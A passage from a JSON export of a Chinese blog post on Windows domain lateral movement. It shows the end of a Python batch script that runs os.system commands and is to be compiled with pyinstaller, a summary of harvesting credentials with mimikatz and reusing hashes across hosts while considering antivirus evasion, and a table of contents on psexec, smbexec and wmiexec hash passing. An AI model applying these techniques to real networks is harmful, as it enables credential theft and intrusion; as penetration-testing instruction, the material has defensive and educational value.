string\">'&lt;---'</span><span class=\"token punctuation\">)</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token keyword\">exec</span><span class=\"token punctuation\">)</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span>exec1<span class=\"token punctuation\">)</span>\ntime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>将写好的fuck_neiwang_002.py脚本编译为pyinstaller.exe可执行的exe文件。</p>\n<p>##0x06 总结</p>\n<p>思路：搜集内网主机ip，相关用户，mimikatz获取密码，所在域等等需要的信息；若是明文密码获取不到，只有hash值，利用脚本编译好的exe文件批量连接获取到的主机或者用户；在这之前考虑使用官方工具还是第三方工具，若是第三方工具还需考虑需不需要做免杀</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/%E4%BC%A0%E9%80%92.png\" alt=\"传递\"></p>\n","text":"0x00 相关知识点0x001、Windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码（mimikatz），只能获取相关的hash值； 2、Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码 解决方法： 1、利用...","link":"","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9\"><span class=\"toc-text\">0x00 相关知识点</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-Procdump-Mimikatz-%E9%85%8D%E5%90%88%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81\"><span class=\"toc-text\">0x01 Procdump+Mimikatz 配合获取密码</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-1\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-1\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">0x02 总结</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-Hashcat%E7%A0%B4%E8%A7%A3%E8%8E%B7%E5%8F%96-Windows-NTML-Hash\"><span class=\"toc-text\">0x02 Hashcat破解获取 Windows-NTML-Hash</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-SMB-%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8-psexec-smbexec-%E5%AE%98%E6%96%B9%E8%87%AA%E5%B8%A6\"><span class=\"toc-text\">0x03 SMB 服务利用-psexec,smbexec(官方自带)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-2\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-psexec-%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">0x01 psexec 第一种方法</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-psexec%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">0x02 psexec第二种方法</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x04-smbexec%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92\"><span class=\"toc-text\">0x04 smbexec明文传递</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x05-smbexec%E5%93%88%E5%B8%8C-hash-%E4%BC%A0%E9%80%92\"><span class=\"toc-text\">0x05 smbexec哈希(hash)传递</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-WMI-%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8-cscript-wmiexec-wmic\"><span class=\"toc-text\">0x04  WMI 服务利用-cscript-wmiexec-wmic</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">0x00 介绍</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E8%87%AA%E5%B8%A6-WMIC-%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92-%E6%97%A0%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">0x01 自带 WMIC 明文传递 无回显</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-%E8%87%AA%E5%B8%A6-cscript-%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92-%E6%9C%89%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">0x02 自带 cscript 明文传递 有回显</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-impacket-wmiexec-%E6%98%8E%E6%96%87%E6%88%96-hash-%E4%BC%A0%E9%80%92-%E6%9C%89%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">0x03 impacket wmiexec 明文或 hash 传递 有回显</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05-%E4%BB%A5%E4%B8%8A%E6%9C%8D%E5%8A%A1-hash-%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">0x05 以上服务 hash 批量利用</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"内网安全-域横向渗透【三】","uid":"f3c27b71dabaf6ecc45b5a407a397e09","slug":"内网安全-域横向渗透【三】","date":"2022-06-28T13:22:21.000Z","updated":"2022-06-29T12:17:00.942Z","comments":true,"path":"api/articles/内网安全-域横向渗透【三】.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 Kerberos 协议###0x00 图解 0x01 介绍 客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检测，成功之后创建 TGT(Ticket-Gr...","link":"","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"内网安全-域横向渗透【一】","uid":"fd6e852f2bcb63bb7a3b0ef31dd46aab","slug":"内网安全-域横向渗透【一】","date":"2022-06-27T00:59:07.000Z","updated":"2022-06-27T14:44:49.944Z","comments":true,"path":"api/articles/内网安全-域横向渗透【一】.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 明文传递 at&amp;schtasks###0x00 思路及流程 1、在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，可以横向渗透拿下更多的主机在已知目标系统的用户明文密码的基础上， 使用at&amp;schtasks 命令，直接可以在远程...","link":"","photos":[],"count_time":{"symbolsCount":"5.2k","symbolsTime":"5 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}